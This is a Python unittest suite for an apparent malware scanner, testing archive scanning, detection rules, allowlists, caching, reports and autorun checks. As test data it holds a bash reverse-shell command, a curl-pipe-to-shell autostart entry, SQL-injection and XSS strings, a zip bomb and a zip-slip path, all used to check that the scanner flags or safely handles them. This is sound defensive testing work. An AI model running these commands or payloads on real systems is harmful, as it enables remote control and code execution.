"""Tests for the v0.2 features. Run everything with:  python -m unittest discover tests"""

import io
import json
import os
import sys
import tarfile
import tempfile
import unittest
import zipfile
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
os.environ.setdefault("GUARDIAN_HOME", tempfile.mkdtemp())

from guardian import archive, autoruns, report                       # noqa: E402
from guardian.advisor import explain                                  # noqa: E402
from guardian.allowlist import Allowlist                              # noqa: E402
from guardian.history import Store                                    # noqa: E402
from guardian.rules import Rules, DEFAULT_RULES                       # noqa: E402
from guardian.scanner import Engine, ScanResult, scan_path            # noqa: E402
from guardian.signatures import EICAR                                 # noqa: E402

# Built from two pieces so this test file does not itself contain the full
# pattern (see the note in rules.py about scanners flagging their own rules).
REVERSE_SHELL = "".join(["bash -i >", "& /dev/tcp/10.0.0.1/4444 0>&1"]).encode()


class Base(unittest.TestCase):
    def setUp(self):
        # A fresh data folder per test: no state leaks between tests.
        os.environ["GUARDIAN_HOME"] = tempfile.mkdtemp()
        self.dir = Path(tempfile.mkdtemp())

    def write(self, name, data):
        p = self.dir / name
        p.write_bytes(data)
        return p

    def zip_bytes(self, members: dict) -> bytes:
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
            for n, d in members.items():
                z.writestr(n, d)
        return buf.getvalue()

    def scan_one(self, p, **kw):
        return next(scan_path(p, **kw))


class ArchiveTests(Base):
    def test_eicar_inside_zip_is_malicious(self):
        p = self.write("invoice.zip", self.zip_bytes({"readme.txt": b"hi", "doc.txt": EICAR}))
        r = self.scan_one(p)
        self.assertEqual(r.verdict, "malicious")
        self.assertIn("EICAR", r.signature)
        self.assertEqual(r.members_checked, 2)
        self.assertTrue(any("Inside doc.txt" in x for x in r.reasons))

    def test_disguised_program_inside_zip_is_flagged(self):
        p = self.write("photos.zip", self.zip_bytes({"holiday.jpg": b"MZ" + b"\0" * 200}))
        self.assertIn(self.scan_one(p).verdict, ("suspicious", "malicious"))

    def test_clean_zip_is_clean(self):
        p = self.write("notes.zip", self.zip_bytes({"a.txt": b"hello", "b.txt": b"world"}))
        self.assertEqual(self.scan_one(p).verdict, "clean")

    def test_eicar_inside_tar_gz_is_malicious(self):
        buf = io.BytesIO()
        with tarfile.open(fileobj=buf, mode="w:gz") as tf:
            info = tarfile.TarInfo("payload.txt")
            info.size = len(EICAR)
            tf.addfile(info, io.BytesIO(EICAR))
        p = self.write("bundle.tar.gz", buf.getvalue())
        self.assertEqual(self.scan_one(p).verdict, "malicious")

    def test_nested_zip_is_searched(self):
        inner = self.zip_bytes({"evil.txt": EICAR})
        p = self.write("outer.zip", self.zip_bytes({"inner.zip": inner}))
        r = self.scan_one(p)
        self.assertEqual(r.verdict, "malicious")
        self.assertTrue(any("inner.zip!/evil.txt" in x for x in r.reasons))

    def test_zip_bomb_is_flagged_without_exploding(self):
        # 25 MB of zeros compresses to a few KB: ratio is enormous.
        p = self.write("bomb.zip", self.zip_bytes({"big.bin": b"\0" * (25 * 1024 * 1024)}))
        r = self.scan_one(p)
        self.assertTrue(any("zip bomb" in x for x in r.reasons))

    def test_zip_slip_names_are_never_extracted(self):
        p = self.write("slip.zip", self.zip_bytes({"../../escape.txt": b"x"}))
        self.scan_one(p)   # must simply not crash or write anywhere
        self.assertFalse((self.dir.parent.parent / "escape.txt").exists())

    def test_corrupt_archive_does_not_crash(self):
        p = self.write("broken.zip", b"PK\x03\x04" + b"garbage" * 20)
        self.assertIn(self.scan_one(p).verdict, ("clean", "suspicious", "error"))

    def test_encrypted_flag_detection(self):
        info = zipfile.ZipInfo("secret.txt")
        info.flag_bits = 0x1
        self.assertTrue(archive.is_encrypted(info))
        self.assertFalse(archive.is_encrypted(zipfile.ZipInfo("plain.txt")))

    def test_office_files_are_not_treated_as_archives(self):
        kind = archive.archive_kind("report.docx", b"PK\x03\x04", {".docx"})
        self.assertEqual(kind, "")

    def test_no_archives_option(self):
        p = self.write("invoice.zip", self.zip_bytes({"doc.txt": EICAR}))
        r = self.scan_one(p, engine=Engine(scan_archives=False))
        self.assertEqual(r.verdict, "clean")


class RulesTests(Base):
    def test_default_rule_fires_on_reverse_shell(self):
        p = self.write("notes.txt", REVERSE_SHELL)
        r = self.scan_one(p)
        self.assertEqual(r.verdict, "malicious")
        self.assertTrue(any("Reverse-shell" in x for x in r.reasons))

    def test_custom_rule_from_json_file(self):
        rule = [{"name": "My-test-rule", "severity": 3, "strings": ["SUPER-SECRET-MARKER"]}]
        Path(os.environ["GUARDIAN_HOME"], "rules.json").write_text(json.dumps(rule))
        r = self.scan_one(self.write("a.txt", b"xx SUPER-SECRET-MARKER xx"))
        self.assertEqual(r.verdict, "malicious")

    def test_severity_one_is_informational_only(self):
        rule = [{"name": "Info", "severity": 1, "strings": ["hello"]}]
        Path(os.environ["GUARDIAN_HOME"], "rules.json").write_text(json.dumps(rule))
        r = self.scan_one(self.write("a.txt", b"hello world"))
        self.assertEqual(r.verdict, "clean")

    def test_malformed_rules_are_ignored(self):
        bad = [{"name": "x"}, {"name": "y", "severity": 9, "strings": ["a"]},
               {"name": "z", "severity": 2, "strings": []}, "not a dict",
               {"name": "ok", "severity": 2, "strings": ["fine"]}]
        self.assertEqual(len(Rules(bad).rules), 1)

    def test_corrupt_rules_file_falls_back_to_defaults(self):
        Path(os.environ["GUARDIAN_HOME"], "rules.json").write_text("{not json")
        self.assertEqual(len(Rules.load().rules), len(DEFAULT_RULES))

    def test_case_insensitive_rule(self):
        rule = Rules([{"name": "n", "severity": 2, "strings": ["abc"], "nocase": True}])
        self.assertTrue(rule.match("f.txt", b"xxABCxx"))
        self.assertFalse(Rules([{"name": "n", "severity": 2, "strings": ["abc"]}]).match("f.txt", b"ABC"))


class AllowlistTests(Base):
    def test_allowlist_cancels_heuristic_alarm(self):
        p = self.write("photo.jpg", b"MZ" + b"\0" * 200)
        # Files in a temp folder score a little higher, so accept either flag.
        self.assertIn(self.scan_one(p).verdict, ("suspicious", "malicious"))
        from guardian.hashing import sha256_file
        Allowlist.load().add(sha256_file(p), "my own tool")
        r = self.scan_one(p)
        self.assertEqual(r.verdict, "clean")
        self.assertTrue(any("allowlisted" in x for x in r.reasons))

    def test_known_malware_cannot_be_allowlisted(self):
        p = self.write("eicar.txt", EICAR)
        from guardian.hashing import sha256_file
        Allowlist.load().add(sha256_file(p))
        self.assertEqual(self.scan_one(p).verdict, "malicious")

    def test_changed_file_loses_its_exemption(self):
        p = self.write("tool.jpg", b"MZ" + b"\0" * 200)
        from guardian.hashing import sha256_file
        Allowlist.load().add(sha256_file(p))
        p.write_bytes(b"MZ" + b"\1" * 200)    # attacker swaps the file
        self.assertIn(self.scan_one(p).verdict, ("suspicious", "malicious"))


class ScanEngineTests(Base):
    def test_parallel_scan_returns_every_file(self):
        for i in range(150):
            self.write(f"f{i}.txt", f"content {i}".encode())
        results = list(scan_path(self.dir, workers=4))
        self.assertEqual(len(results), 150)
        self.assertTrue(all(r.verdict == "clean" for r in results))

    def test_cache_hit_on_second_scan(self):
        self.write("a.txt", b"hello")
        self.write("b.txt", b"world")
        first = list(scan_path(self.dir, use_cache=True))
        second = list(scan_path(self.dir, use_cache=True))
        self.assertFalse(any(r.cached for r in first))
        self.assertTrue(all(r.cached for r in second))

    def test_cache_invalidated_when_file_changes(self):
        p = self.write("a.txt", b"hello")
        list(scan_path(self.dir, use_cache=True))
        p.write_bytes(b"hello but longer now")
        self.assertFalse(next(scan_path(self.dir, use_cache=True)).cached)

    def test_cache_invalidated_when_engine_changes(self):
        self.write("a.txt", b"hello")
        list(scan_path(self.dir, use_cache=True))
        Path(os.environ["GUARDIAN_HOME"], "rules.json").write_text(
            json.dumps([{"name": "n", "severity": 3, "strings": ["hello"]}]))
        r = next(scan_path(self.dir, use_cache=True))
        self.assertFalse(r.cached)
        self.assertEqual(r.verdict, "malicious")

    def test_unreadable_member_never_crashes_scan(self):
        self.write("ok.txt", b"fine")
        self.assertEqual(len(list(scan_path(self.dir))), 1)


class HistoryAndReportTests(Base):
    def test_history_records_scans_and_findings(self):
        with Store() as s:
            sid = s.start_scan("/some/folder")
            r = ScanResult(path="/x/bad.exe", sha256="a" * 64, verdict="malicious",
                           score=0.97, reasons=["because"])
            s.add_finding(sid, r)
            s.finish_scan(sid, 10, 1)
            rows = s.recent_scans()
            self.assertEqual(rows[0][3:], ("/some/folder", 10, 1))
            self.assertEqual(s.findings_for(sid)[0][1], "malicious")

    def test_sql_injection_in_filename_is_harmless(self):
        with Store() as s:
            sid = s.start_scan("x'); DROP TABLE scans;--")
            s.finish_scan(sid, 1, 0)
            self.assertEqual(len(s.recent_scans()), 1)

    def test_html_report_escapes_hostile_filenames(self):
        r = ScanResult(path="<script>alert(1)</script>.exe", verdict="malicious",
                       score=0.99, reasons=["<img src=x onerror=alert(1)>"])
        out = report.to_html([r], 1, "<b>target</b>")
        self.assertNotIn("<script>", out)
        self.assertNotIn("<img", out)
        self.assertIn("&lt;script&gt;", out)

    def test_json_report_roundtrip(self):
        r = ScanResult(path="a", verdict="suspicious", score=0.5)
        data = json.loads(report.to_json([r], 3, "t"))
        self.assertEqual(data["files_scanned"], 3)
        self.assertEqual(data["flagged"][0]["verdict"], "suspicious")


class AutorunTests(Base):
    def test_linux_autostart_entry_is_assessed(self):
        d = self.dir / ".config" / "autostart"
        d.mkdir(parents=True)
        (d / "evil.desktop").write_text(
            "[Desktop Entry]\nName=Updater\nExec=bash -c 'curl http://203.0.113.9/x | sh'\n")
        (d / "calm.desktop").write_text("[Desktop Entry]\nName=Notes\nExec=/usr/bin/notes\n")
        entries = {e.name: e for e in autoruns.collect(self.dir, "linux", include_cron=False)}
        self.assertEqual(entries["calm.desktop"].risk, "low")
        self.assertIn(entries["evil.desktop"].risk, ("medium", "high"))

    def test_assess_flags_temp_launch(self):
        self.assertTrue(autoruns.assess("/tmp/.x/payload --run"))
        self.assertEqual(autoruns.assess("/usr/bin/firefox"), [])

    def test_macos_plist_is_read(self):
        import plistlib
        d = self.dir / "Library" / "LaunchAgents"
        d.mkdir(parents=True)
        with open(d / "x.plist", "wb") as f:
            plistlib.dump({"Label": "com.bad.agent", "ProgramArguments": ["/tmp/agent", "-d"]}, f)
        entries = autoruns.collect(self.dir, "darwin")
        self.assertTrue(any(e.name == "com.bad.agent" and e.reasons for e in entries))


class AdvisorTests(Base):
    def test_does_not_claim_quarantine_when_not_quarantined(self):
        r = ScanResult(path="x", verdict="malicious", score=1.0)
        self.assertNotIn("moved to quarantine", explain(r).lower())
        self.assertIn("still where it was found", explain(r))

    def test_says_quarantined_when_it_was(self):
        r = ScanResult(path="x", verdict="malicious", score=1.0, quarantined=True)
        self.assertIn("moved to quarantine", explain(r).lower())


class CliTests(Base):
    def run_cli(self, *argv):
        from guardian.cli import main
        buf, old = io.StringIO(), sys.stdout
        sys.stdout = buf
        try:
            code = main(list(argv))
        finally:
            sys.stdout = old
        return code, buf.getvalue()

    def test_scan_quarantine_report_and_history(self):
        self.write("eicar.txt", EICAR)
        self.write("fine.txt", b"ok")
        out_html = self.dir / "r.html"
        code, text = self.run_cli("scan", str(self.dir), "-q", "--report", str(out_html))
        self.assertEqual(code, 1)
        self.assertIn("Moved to quarantine", text)
        self.assertTrue(out_html.exists())
        self.assertFalse((self.dir / "eicar.txt").exists())
        _, hist = self.run_cli("history")
        self.assertIn("1 flagged", hist)

    def test_status_and_rules_commands(self):
        self.assertEqual(self.run_cli("status")[0], 0)
        self.assertIn("rules", self.run_cli("rules")[1].lower())

    def test_closed_pipe_is_not_a_crash(self):
        from unittest import mock
        with mock.patch("guardian.cli.cmd_status", side_effect=BrokenPipeError):
            self.assertEqual(self.run_cli("status")[0], 0)

    def test_ctrl_c_exits_cleanly(self):
        from unittest import mock
        with mock.patch("guardian.cli.cmd_status", side_effect=KeyboardInterrupt):
            self.assertEqual(self.run_cli("status")[0], 130)

    def test_allow_command_roundtrip(self):
        p = self.write("tool.jpg", b"MZ" + b"\0" * 100)
        self.run_cli("allow", str(p))
        _, listing = self.run_cli("allow", "--list")
        self.assertIn("tool.jpg", listing)


if __name__ == "__main__":
    unittest.main()
